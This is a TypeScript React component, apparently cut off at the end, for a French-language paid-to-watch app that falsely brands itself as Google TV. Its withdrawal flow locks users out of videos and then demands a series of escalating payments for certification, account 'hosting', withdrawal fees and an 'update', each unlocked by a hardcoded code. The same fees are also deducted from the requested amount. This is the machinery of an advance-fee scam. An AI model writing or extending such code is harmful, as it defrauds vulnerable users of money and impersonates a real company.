import { useEffect, useMemo, useState, type ReactNode } from 'react';
import { Banknote, Home, CheckCircle2, Clock3, Loader2, LogOut, Play, RefreshCw, RotateCcw, UserRound, Video, XCircle } from 'lucide-react';
import VideoTab from '@/components/VideoTab';
import { recommended } from '@/data/content';
import { countries, getCountry, getPaymentMethods, getPlanRewardAmount, getPlanWithdrawalLimit } from '@/data/locations';
import { supabase } from '@/lib/supabase';

interface UserHomeProfile {
  id: string;
  first_name: string;
  last_name: string;
  email: string | null;
  phone: string | null;
  country: string | null;
  city: string | null;
  birth_date?: string | null;
  gender?: string | null;
  account_type?: string | null;
  is_certified: boolean;
  suspended_at: string | null;
}

interface UserHomeProps {
  profile: UserHomeProfile;
  onSignOut: () => void;
}

type UserTab = 'home' | 'video' | 'withdrawal' | 'historique' | 'profile';
interface Activity { watched: boolean; liked: boolean; disliked: boolean; favorited: boolean; }
type ActivityKey = 'watched' | 'liked' | 'disliked' | 'favorited';

const recommendationLabels = ['Recommandation 1', 'Recommandation 2', 'Recommandation 3', 'Recommandation 4'];

type WithdrawalFlowSnapshot = { codeStep: boolean; certificationBlocked: boolean; hostingStep: boolean; hostedSuccess: boolean; feeStep: boolean; updateStep: boolean; hostingPaid: boolean; feePaid: boolean; updatePaid: boolean; withdrawalCode: string; paymentMethod: string; withdrawalCountry: string; amount: string; phone: string };
const withdrawalFlowKey = (userId: string) => `gtv-withdrawal-flow-${userId}`;

export default function UserHome({ profile, onSignOut }: UserHomeProps) {
  const [tab, setTab] = useState<UserTab>('home');
  const [withdrawalLocked, setWithdrawalLocked] = useState(false);
  const [activities, setActivities] = useState<Record<string, Activity>>({});
  const [activityError, setActivityError] = useState<string | null>(null);
  const [committedAmount, setCommittedAmount] = useState(0);
  const firstName = profile.first_name || 'vous';
  const rewardAmount = getPlanRewardAmount(profile.account_type);
  const withdrawalLimit = getPlanWithdrawalLimit(profile.account_type);

  useEffect(() => {
    try { if (window.localStorage.getItem(withdrawalFlowKey(profile.id))) setTab('withdrawal'); } catch { /* stockage indisponible */ }
  }, [profile.id]);

  useEffect(() => {
    let mounted = true;
    void supabase.from('user_content_activity').select('content_id, watched, liked, disliked, favorited').eq('user_id', profile.id).then(({ data, error }) => {
      if (!mounted) return;
      if (error) { setActivityError('Les statistiques ne sont pas disponibles pour le moment.'); return; }
      const next: Record<string, Activity> = {};
      (data ?? []).forEach((row) => { next[row.content_id] = { watched: row.watched, liked: row.liked, disliked: row.disliked, favorited: row.favorited }; });
      setActivities(next);
    });
    return () => { mounted = false; };
  }, [profile.id]);

  useEffect(() => {
    let mounted = true;
    void supabase.from('withdrawal_requests').select('amount, status').eq('user_id', profile.id).in('status', ['pending', 'approved']).then(({ data, error }) => {
      if (!mounted) return;
      if (!error) setCommittedAmount((data ?? []).reduce((total, row) => total + Number(row.amount), 0));
    });
    return () => { mounted = false; };
  }, [profile.id, activities]);

  const updateActivity = async (contentId: string, key: ActivityKey, forcedValue?: boolean) => {
    const current = activities[contentId] ?? { watched: false, liked: false, disliked: false, favorited: false };
    const next = { ...current, [key]: forcedValue ?? !current[key] };
    if (key === 'liked' && next.liked) next.disliked = false;
    if (key === 'disliked' && next.disliked) next.liked = false;
    setActivities((value) => ({ ...value, [contentId]: next }));
    setActivityError(null);
    const { error } = await supabase.from('user_content_activity').upsert({ content_id: contentId, watched: next.watched, liked: next.liked, disliked: next.disliked, favorited: next.favorited, updated_at: new Date().toISOString() }, { onConflict: 'user_id,content_id' });
    if (error) {
      setActivities((value) => ({ ...value, [contentId]: current }));
      setActivityError('Cette action n’a pas pu être enregistrée.');
    }
  };

  const markWatched = async (contentId: string) => {
    if (activities[contentId]?.watched) return;
    await updateActivity(contentId, 'watched', true);
  };

  const counts = useMemo(() => Object.values(activities).reduce((result, activity) => ({
    watched: result.watched + Number(activity.watched),
    liked: result.liked + Number(activity.liked),
    favorited: result.favorited + Number(activity.favorited),
    rewarded: result.rewarded + Number(activity.watched && activity.liked && activity.favorited),
  }), { watched: 0, liked: 0, favorited: 0, rewarded: 0 }), [activities]);

  const earnedBalance = counts.rewarded * rewardAmount;
  const availableBalance = Math.max(0, earnedBalance - committedAmount);
  const withdrawalRequired = availableBalance >= withdrawalLimit;

  return <div className="user-home min-h-screen bg-[#090d14] pb-24 text-slate-100">
    <header className="border-b border-white/10 bg-[#0b0f17] px-5 py-5 sm:px-10"><div className="mx-auto flex max-w-6xl items-center justify-between"><div className="flex items-center gap-2"><span className="google-mark">G</span><span className="text-2xl font-bold tracking-tight text-white">Google</span><span className="rounded-lg bg-[#4285f4] px-2.5 py-1 text-lg font-bold text-white shadow-[0_0_20px_rgba(66,133,244,.4)]">TV</span></div><button onClick={onSignOut} className="inline-flex items-center gap-2 rounded-xl bg-[#171c25] px-4 py-3 text-sm font-semibold text-slate-300 transition hover:bg-[#222936] hover:text-white sm:px-6"><LogOut className="h-4 w-4" /> Déconnexion</button></div></header>
    <main className="mx-auto max-w-6xl px-5 sm:px-10">
      {tab === 'home' && <HomeTab firstName={firstName} isCertified={profile.is_certified} onDiscover={() => setTab('video')} />}
      {tab === 'video' && (withdrawalRequired
        ? <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 text-center shadow-2xl sm:p-12"><RotateCcw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Retrait obligatoire avant de continuer</h1><p className="mt-4 leading-7 text-slate-300">Votre solde disponible de <b>{availableBalance.toLocaleString('fr-FR')} XOF</b> a atteint la limite de <b>{withdrawalLimit.toLocaleString('fr-FR')} XOF</b> de votre type de compte.</p><p className="mt-3 text-sm text-slate-400">Vous devez effectuer un retrait avant de pouvoir continuer à regarder des vidéos.</p><button onClick={() => setTab('withdrawal')} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Aller au retrait</button></div></section>
        : <VideoTab activities={activities} rewardAmount={rewardAmount} onActivity={updateActivity} onWatched={markWatched} />)}
      {tab === 'withdrawal' && <WithdrawalTab profile={profile} counts={counts} rewardAmount={rewardAmount} onPendingChange={setWithdrawalLocked} />}
      {tab === 'historique' && <HistoryTab profileId={profile.id} />}
      {tab === 'profile' && <ProfileTab profile={profile} counts={counts} />}
      {activityError && <p className="fixed bottom-24 left-1/2 z-40 -translate-x-1/2 rounded-xl border border-red-400/30 bg-[#2a1720] px-4 py-3 text-sm text-red-200 shadow-xl">{activityError}</p>}
    </main>
    <nav className="fixed inset-x-0 bottom-0 z-30 border-t border-white/10 bg-[#11151e]/95 px-3 py-3 shadow-[0_-12px_35px_rgba(0,0,0,.35)] backdrop-blur-xl"><div className="mx-auto grid max-w-2xl grid-cols-5 gap-2">{([{ id: 'home', label: 'Accueil', icon: Home }, { id: 'video', label: 'Vidéo', icon: Video }, { id: 'withdrawal', label: 'Retrait', icon: RotateCcw }, { id: 'historique', label: 'Historique', icon: Clock3 }, { id: 'profile', label: 'Profil', icon: UserRound }] as const).map(({ id, label, icon: Icon }) => <button key={id} onClick={() => { if (!withdrawalLocked || id === 'withdrawal') setTab(id); }} disabled={withdrawalLocked && id !== 'withdrawal'} className={`flex flex-col items-center gap-1 rounded-xl px-2 py-2 text-xs font-semibold transition sm:text-sm ${tab === id ? 'text-blue-400' : 'text-slate-500 hover:bg-white/5 hover:text-slate-300'} disabled:cursor-not-allowed disabled:opacity-40`}><Icon className="h-6 w-6" strokeWidth={tab === id ? 2.5 : 2} /><span>{label}</span></button>)}</div></nav>
  </div>;
}

function HomeTab({ firstName, isCertified, onDiscover }: { firstName: string; isCertified: boolean; onDiscover: () => void }) {
  return <div className="pb-10"><section className="relative -mx-5 min-h-[520px] overflow-hidden sm:-mx-10 sm:min-h-[600px]"><img src={recommended[0].image} alt="" className="absolute inset-0 h-full w-full object-cover object-center opacity-70" /><div className="absolute inset-0 bg-gradient-to-r from-[#090d14] via-[#090d14]/75 to-transparent" /><div className="absolute inset-0 bg-gradient-to-t from-[#090d14] via-transparent to-[#090d14]/20" /><div className="relative flex min-h-[520px] items-end px-5 pb-14 sm:min-h-[600px] sm:px-10 sm:pb-20"><div className="max-w-2xl"><h1 className="text-5xl font-black tracking-tight text-white sm:text-7xl">Bonjour, <span className="inline-flex items-center gap-2 align-middle"><span className="hero-gradient">{firstName}</span>{isCertified && <CertifiedBadge />}</span></h1><p className="mt-6 max-w-xl text-xl leading-8 text-slate-300 sm:text-2xl">Bienvenue sur Google TV. Découvrez des milliers de films et séries adaptés à vos goûts.</p><button onClick={onDiscover} className="primary-button mt-8 inline-flex items-center gap-2 rounded-xl px-5 py-3.5 font-bold"><Play className="h-5 w-5 fill-current" /> Découvrir</button></div></div></section><section className="pt-12 sm:pt-16"><h2 className="text-3xl font-black text-white sm:text-4xl">Recommandés pour vous</h2><div className="mt-7 grid grid-cols-2 gap-4 sm:grid-cols-4 sm:gap-5">{recommendationLabels.map((label, index) => { const show = recommended[index]; return <article key={label} className="group overflow-hidden rounded-3xl border border-white/10 bg-[#141a24] transition duration-300 hover:-translate-y-1 hover:border-blue-400/60"><div className="relative aspect-[.76] overflow-hidden"><img src={show.image} alt={label} className="h-full w-full object-cover transition duration-500 group-hover:scale-105" /><div className="absolute inset-x-0 bottom-0 h-1/2 bg-gradient-to-t from-[#10151f] to-transparent" /><div className="absolute bottom-3 left-3 right-3"><p className="text-base font-bold text-white sm:text-lg">Contenu {index + 1}</p><p className="mt-1 text-xs text-slate-300 sm:text-sm">Exclusif · 2026</p></div></div><div className="p-3 sm:p-4"><p className="text-xs font-semibold uppercase tracking-wide text-blue-300">{label}</p></div></article>; })}</div></section></div>;
}

function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { profile: UserHomeProfile; counts: { watched: number; liked: number; favorited: number; rewarded: number }; rewardAmount: number; onPendingChange: (pending: boolean) => void }) {
  const flowKey = withdrawalFlowKey(profile.id);
  const savedFlow = (() => {
    try {
      const raw = window.localStorage.getItem(flowKey);
      if (!raw) return null;
      const parsed = JSON.parse(raw) as WithdrawalFlowSnapshot;
      if (parsed.updatePaid === true) {
        return { ...parsed, updateStep: true, updatePaid: false };
      }
      return parsed;
    } catch {
      return null;
    }
  })();
  const savedHostingPaid = savedFlow?.hostingPaid === true;
  const savedFeePaid = savedFlow?.feePaid === true;
  const savedUpdatePaid = savedFlow?.updatePaid === true;
  const [paymentMethod, setPaymentMethod] = useState(savedFlow?.paymentMethod ?? '');
  const [withdrawalCountry, setWithdrawalCountry] = useState(savedFlow?.withdrawalCountry ?? profile.country ?? '');
  const [amount, setAmount] = useState(savedFlow?.amount ?? '');
  const [phone, setPhone] = useState(savedFlow?.phone ?? profile.phone?.replace(/^\+\d+\s?/, '') ?? '');
  const [withdrawalCode, setWithdrawalCode] = useState(savedFlow?.withdrawalCode ?? '');
  const [hostingPaid, setHostingPaid] = useState(savedHostingPaid);
  const [feePaid, setFeePaid] = useState(savedFeePaid);
  const [updatePaid, setUpdatePaid] = useState(savedUpdatePaid);
  const taxPaidKey = `gtv-tax-paid-${profile.id}`;
  const [taxPaid, setTaxPaid] = useState(() => { try { return window.localStorage.getItem(taxPaidKey) === '1'; } catch { return false; } });
  const [codeStep, setCodeStep] = useState(savedFlow?.codeStep === true && !taxPaid && !profile.is_certified);
  const [certificationBlocked, setCertificationBlocked] = useState(!profile.is_certified && (savedFlow?.certificationBlocked === true || taxPaid));
  const [codeReady, setCodeReady] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [validating, setValidating] = useState(false);
  const [certChecked, setCertChecked] = useState(false);
  const [certifiedNow, setCertifiedNow] = useState(profile.is_certified);
  const [hostingStep, setHostingStep] = useState(savedFlow?.hostingStep === true || (profile.is_certified && !savedHostingPaid));
  const [hostingCode, setHostingCode] = useState('');
  const [hostingError, setHostingError] = useState<string | null>(null);
  const [withdrawalProcessing, setWithdrawalProcessing] = useState(false);
  const [hostedSuccess, setHostedSuccess] = useState(false);
  const [feeStep, setFeeStep] = useState(savedFlow?.feeStep === true || (savedHostingPaid && savedFeePaid && !savedUpdatePaid));
  const [hostingContinued, setHostingContinued] = useState(savedFlow?.feeStep === true || savedFlow?.updateStep === true || (savedHostingPaid && (savedFeePaid || savedUpdatePaid)));
  const [feeCode, setFeeCode] = useState('');
  const [feeError, setFeeError] = useState<string | null>(null);
  const [feeValidation, setFeeValidation] = useState(false);
  const [updateStep, setUpdateStep] = useState(savedFlow?.updateStep === true || (savedHostingPaid && savedFeePaid && !savedUpdatePaid));
  const [updateCode, setUpdateCode] = useState('');
  const [updateError, setUpdateError] = useState<string | null>(null);
  const [latestRequest, setLatestRequest] = useState<{ status: string; amount: number } | null>(null);
  const [dismissedLatest, setDismissedLatest] = useState(false);
  const [committedAmount, setCommittedAmount] = useState(0);
  const [balanceReady, setBalanceReady] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const beneficiary = `${profile.first_name} ${profile.last_name}`.trim();
  const paymentMethods = getPaymentMethods(withdrawalCountry);
  const dialCode = getCountry(withdrawalCountry)?.dialCode ?? '+';
  const earnedBalance = counts.rewarded * rewardAmount;
  const availableBalance = balanceReady ? Math.max(0, earnedBalance - committedAmount) : 0;

  useEffect(() => {
    let mounted = true;
    const fetchRequests = async () => {
      const { data, error } = await supabase.from('withdrawal_requests').select('amount, status, created_at').eq('user_id', profile.id).order('created_at', { ascending: false });
      if (!mounted) return;
      if (error) {
        setBalanceReady(false);
        setErrorMessage('Le solde disponible ne peut pas être vérifié pour le moment.');
        return;
      }
      const rows = data ?? [];
      setCommittedAmount(rows.filter((row) => row.status === 'pending' || row.status === 'approved').reduce((total, row) => total + Number(row.amount), 0));
      const nextRequest = rows.length > 0 ? { status: String(rows[0].status), amount: Number(rows[0].amount) } : null;
      setLatestRequest(nextRequest);
      onPendingChange(nextRequest?.status === 'pending');
      setBalanceReady(true);
    };
    void fetchRequests();
    const timer = window.setInterval(fetchRequests, 5000);
    return () => { mounted = false; window.clearInterval(timer); };
  }, [profile.id, dismissedLatest, onPendingChange]);

  useEffect(() => {
    if (!certificationBlocked) return undefined;
    setCertChecked(false);
    setCertifiedNow(false);
    let active = true;
    const check = async () => {
      const { data } = await supabase.from('profiles').select('is_certified').eq('id', profile.id).maybeSingle();
      if (!active) return;
      if (data?.is_certified) { setCertifiedNow(true); setCertChecked(true); }
      else setCertChecked(true);
    };
    void check();
    const timer = window.setInterval(check, 5000);
    return () => { active = false; window.clearInterval(timer); };
  }, [certificationBlocked, profile.id]);

  useEffect(() => {
    if (!codeStep) return undefined;
    setCodeReady(false);
    const timer = window.setTimeout(() => setCodeReady(true), 3000);
    return () => window.clearTimeout(timer);
  }, [codeStep]);

  useEffect(() => {
    const flowActive = codeStep || certificationBlocked || hostingStep || hostedSuccess || feeStep || updateStep || hostingPaid || feePaid || updatePaid;
    if (!flowActive) { try { window.localStorage.removeItem(flowKey); } catch { /* stockage indisponible */ } return; }
    const snapshot: WithdrawalFlowSnapshot = { codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, hostingPaid, feePaid, updatePaid, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone };
    try { window.localStorage.setItem(flowKey, JSON.stringify(snapshot)); } catch { /* stockage indisponible */ }
  }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, hostingPaid, feePaid, updatePaid, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone]);

  const beginSubmit = () => {
    setErrorMessage(null);
    setHostingCode('');
    setHostingError(null);
    if (profile.is_certified) {
      if (hostingPaid && feePaid && updatePaid) { void submit(); return; }
      if (hostingPaid && feePaid) { setUpdateStep(true); return; }
      if (hostingPaid) { setFeeStep(true); return; }
      setHostingStep(true);
      return;
    }
    if (taxPaid) { setCertificationBlocked(true); return; }
    setCodeStep(true);
  };

  const proceedToHosting = async () => {
    if (!withdrawalCode.trim()) {
      setErrorMessage('Saisissez votre code de retrait.');
      return;
    }
    setSubmitting(true);
    setValidating(true);
    setErrorMessage(null);
    const { data, error } = await supabase.rpc('verify_payment_code', { p_user_id: profile.id, p_code: withdrawalCode.trim() });
    setValidating(false);
    setSubmitting(false);
    if (error) {
      setErrorMessage('La vérification du code a échoué. Veuillez réessayer.');
      return;
    }
    if (!data) {
      setErrorMessage('Le code de retrait est incorrect. Vérifiez-le puis réessayez.');
      return;
    }
    try { window.localStorage.setItem(taxPaidKey, '1'); } catch { /* stockage indisponible */ }
    setTaxPaid(true);
    setCodeStep(false);
    setWithdrawalProcessing(true);
    window.setTimeout(() => {
      setWithdrawalProcessing(false);
      setCertificationBlocked(true);
    }, 2000);
  };

  const WITHDRAWAL_FEE = 95800;
  const HOSTING_RELOAD = 55890;
  const UPDATE_COST = 150700;
  const REACTIVATION_COST = 120945;
  const netAmount = Math.max(0, Number(amount) - WITHDRAWAL_FEE - HOSTING_RELOAD - UPDATE_COST - REACTIVATION_COST);

  const submit = async () => {
    setSubmitting(true);
    setWithdrawalProcessing(true);
    setErrorMessage(null);
    const { error } = await supabase.rpc('submit_withdrawal_request', { p_amount: netAmount, p_payment_method: paymentMethod, p_phone: phone, p_country: withdrawalCountry, p_city: profile.city ?? '', p_payment_code: withdrawalCode.trim() });
    if (error) {
      setWithdrawalProcessing(false);
      setSubmitting(false);
      if (error.message.includes('certification')) { setCertificationBlocked(true); return; }
      if (error.message.includes('payment code')) setErrorMessage('Le code de retrait est incorrect. Vérifiez-le puis réessayez.');
      else if (error.message.includes('already pending')) setErrorMessage('Une demande de retrait est déjà en attente. Elle doit être traitée avant une nouvelle demande.');
      else if (error.message.includes('not eligible')) setErrorMessage('Votre compte ne peut pas effectuer ce retrait pour le moment. Veuillez contacter l’administrateur.');
      else if (error.message.includes('exceeds')) setErrorMessage('Le montant demandé dépasse votre solde disponible.');
      else setErrorMessage('Votre demande n’a pas pu être envoyée. Veuillez vérifier les informations puis réessayer.');
      return;
    }
    setAmount('');
    setCodeStep(false);
    setDismissedLatest(false);
    setLatestRequest({ status: 'pending', amount: netAmount });
    onPendingChange(true);
    const { data: refreshData } = await supabase.from('withdrawal_requests').select('amount, status, created_at').eq('user_id', profile.id).order('created_at', { ascending: false });
    if (refreshData && refreshData.length > 0) {
      const refreshedRequest = { status: String(refreshData[0].status), amount: Number(refreshData[0].amount) };
      setLatestRequest(refreshedRequest);
      onPendingChange(refreshedRequest.status === 'pending');
      setCommittedAmount(refreshData.filter((row) => row.status === 'pending' || row.status === 'approved').reduce((total, row) => total + Number(row.amount), 0));
    }
    setWithdrawalProcessing(false);
    setSubmitting(false);
  };

  if (latestRequest && !dismissedLatest && latestRequest.status === 'pending') return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait est en cours de validation</h1><p className="mt-4 leading-7 text-slate-300">Votre demande de <b>{latestRequest.amount.toLocaleString('fr-FR')} XOF</b> est en cours de traitement.</p><p className="mt-5 text-sm text-slate-400">Cette page restera affichée jusqu’à la décision de l’administrateur.</p></div></section>;

  if (latestRequest && !dismissedLatest && latestRequest.status === 'rejected') return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-red-400/30 bg-[#241318] p-8 text-center shadow-2xl sm:p-12"><XCircle className="mx-auto h-12 w-12 text-red-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait a échoué</h1><p className="mt-4 leading-7 text-slate-300">Veuillez réessayer avec une nouvelle demande de retrait.</p><p className="mt-3 text-sm text-slate-400">Aucun montant n’a quitté votre compte : votre solde reste disponible pour une nouvelle demande.</p><button onClick={() => { setDismissedLatest(true); setLatestRequest(null); setCodeStep(false); setCertificationBlocked(false); setHostingStep(false); setHostingPaid(false); setHostedSuccess(false); setFeeStep(false); setFeePaid(false); setUpdateStep(false); setUpdatePaid(false); setHostingContinued(false); setWithdrawalProcessing(false); try { window.localStorage.removeItem(flowKey); } catch { /* stockage indisponible */ } }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Faire une nouvelle demande</button></div></section>;

  if (latestRequest && !dismissedLatest && latestRequest.status === 'approved') return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait a été effectué avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre demande de <b>{latestRequest.amount.toLocaleString('fr-FR')} XOF</b> a été validée.</p><button onClick={() => setDismissedLatest(true)} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Retour au retrait</button></div></section>;

  if (certificationBlocked) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><img src="/assets/icons/file_00000000f4308210a788b98916b52e8e.png" alt="Compte certifié" className="mx-auto h-16 w-16 object-contain" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre compte n'est pas autorisé à faire des retraits.</h1><p className="mt-4 leading-7 text-slate-300">Veuillez certifier votre compte.</p><p className="mt-3 text-sm text-slate-400">Coût de la certification : <b>35 580 XOF&nbsp;</b></p>{!certChecked ? <div className="mt-8"><Loader2 className="mx-auto h-8 w-8 animate-spin text-blue-400" /><p className="mt-4 text-sm text-slate-400">Vérification de votre certification…</p></div> : certifiedNow ? <button onClick={() => { setCertificationBlocked(false); setCodeStep(false); setHostingCode(''); setHostingError(null); if (hostingPaid && feePaid && updatePaid) void submit(); else if (hostingPaid && feePaid) setUpdateStep(true); else if (hostingPaid) setFeeStep(true); else setHostingStep(true); }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Continuer</button> : <div><p className="mt-8 rounded-xl border border-amber-400/30 bg-amber-500/10 px-4 py-3 text-sm text-amber-200">Votre compte n’est pas encore certifié.</p><button disabled className="mt-5 cursor-not-allowed rounded-xl px-6 py-3 font-bold opacity-50">Continuer</button></div>}</div></section>;

  if (withdrawalProcessing && !latestRequest) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Retrait en cours</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;

  if (feeValidation) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Validation en cours</h1><p className="mt-4 leading-7 text-slate-400">Vérification de vos frais de retrait…</p></div></section>;

  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setUpdatePaid(true); setFeePaid(true); setFeeStep(false); setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={submitting || !updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button></div></div></section>;

  if (hostingPaid && !hostingContinued) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Compte hébergé avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre compte Google TV a bien été hébergé. Vous pouvez poursuivre votre demande de retrait.</p><button onClick={() => { setHostingContinued(true); setHostedSuccess(false); setFeeCode(''); setFeeError(null); setFeeStep(true); }} className="primary-button mt-8 w-full rounded-2xl px-5 py-4 text-lg font-bold">Continuer</button></div></section>;

  if (feeStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><Banknote className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez payer les frais de retrait afin que votre retrait soit effectué avec succès</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Frais de retrait</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">95 800 F CFA</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de frais de retrait"><input type="text" autoComplete="one-time-code" value={feeCode} onChange={(event) => { setFeeCode(event.target.value); setFeeError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{feeError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{feeError}</p>}<button onClick={() => { if (feeCode.trim().toUpperCase() === 'GTV-F95207') { setFeePaid(true); setFeeError(null); setFeeStep(false); setFeeValidation(true); window.setTimeout(() => { setFeeValidation(false); setUpdateCode(''); setUpdateError(null); setUpdateStep(true); }, 3000); } else { setFeeError('Le code de frais de retrait est incorrect.'); } }} disabled={!feeCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Payer les frais et confirmer le retrait</button></div></div></section>;

  if (hostingStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 shadow-2xl sm:p-12"><div className="rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center sm:p-8"><h2 className="text-base font-black leading-7 text-white sm:text-lg">Nous vous recommandons de faire l'hébergement de votre compte Google TV avec une rechargement de <b>55 890 XOF</b> avant que vous puissiez effectuer votre retrait</h2></div><div className="mt-8 text-left"><WithdrawalField label="Code d'hébergement"><input type="text" value={hostingCode} onChange={(event) => { setHostingCode(event.target.value); setHostingError(null); }} placeholder="Saisissez le code d'hébergement" className="withdrawal-input" /></WithdrawalField>{hostingError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{hostingError}</p>}<button onClick={() => { if (hostingCode.trim().toUpperCase() === 'GTV-H88401') { setHostingPaid(true); setHostingStep(false); setHostingError(null); setHostedSuccess(true); } else { setHostingError('Le code d’hébergement est incorrect.'); } }} disabled={!hostingCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Valider l'hébergement</button></div></div></section>;

  if (validating) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre compte est en cours de validation</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;

  if (latestRequest && !dismissedLatest && latestRequest.status === 'pending') return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait est en cours de validation</h1><p className="mt-4 leading-7 text-slate-300">Votre demande de <b>{latestRequest.amount.toLocaleString('fr-FR')} XOF</b> est en cours de traitement.</p></div></section>;

